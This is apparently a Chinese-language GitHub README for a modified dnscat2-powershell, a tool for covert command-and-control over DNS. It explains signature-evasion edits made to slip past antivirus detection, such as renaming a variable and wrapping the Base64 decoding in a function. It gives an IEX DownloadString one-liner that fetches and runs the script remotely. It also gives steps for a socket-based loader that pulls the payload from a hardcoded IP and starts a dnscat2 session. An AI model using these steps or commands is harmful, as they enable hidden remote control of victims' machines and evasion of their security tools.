# dnscat2-powershell
dnscat2-powershell去文件特征，新下载方式

## 源码

[d1.ps1](https://github.com/Mob2003/dnscat2-powershell/blob/main/d1.ps1)，修改了两处特征：
 1. 源码第三行 $EncodedCompressedFile,改个变量名

 2. 源码第六行，连续调用IO.Compression.DeflateStream 与[IO.MemoryStream][Convert]::FromBase64String 那么只需要对$EncodedCompressedFile 改个名字，另外再把Frombase64String提取出来做个函数，如下图
 
## 使用方法
 ```shell
 IEX (New-Object System.Net.Webclient).DownloadString('https://github.com/Mob2003/dnscat2-powershell/blob/main/d1.ps')
 ```
 具体请查看原始项目 [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)
 
## 新式加载方法（仅限http）
 1. 将d1.ps或者把你自己修改好的powershell脚本，上传到nginx根目录，亦或者其他web服务器根目录
 2. 下载[远程加载.ps1](https://github.com/Mob2003/dnscat2-powershell/blob/main/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD.ps1)，修改以下为你的**http服务器ip**，与**文件路径**
    - 12行 socket.Connect(" $\color{red}{14.119.104.189}$ ", $\color{red}{80}$)
    - 13行 GET $\color{red}{/d1.ps1}$ HTTP/1.1\r\nHost: $\color{red}{14.119.104.189}$\r\n\r\n
 3. 修改启动参数
    - 50行 start-Dnscat2 -PreSharedSecret $\color{red}{12345678}$ -DNSServer $\color{red}{14.119.104.189}$  -Domain  $\color{red}{you domain}$
 4. 执行修改好的**远程加载.ps1**，或者将里面的内容复制粘贴到powershell里面执行
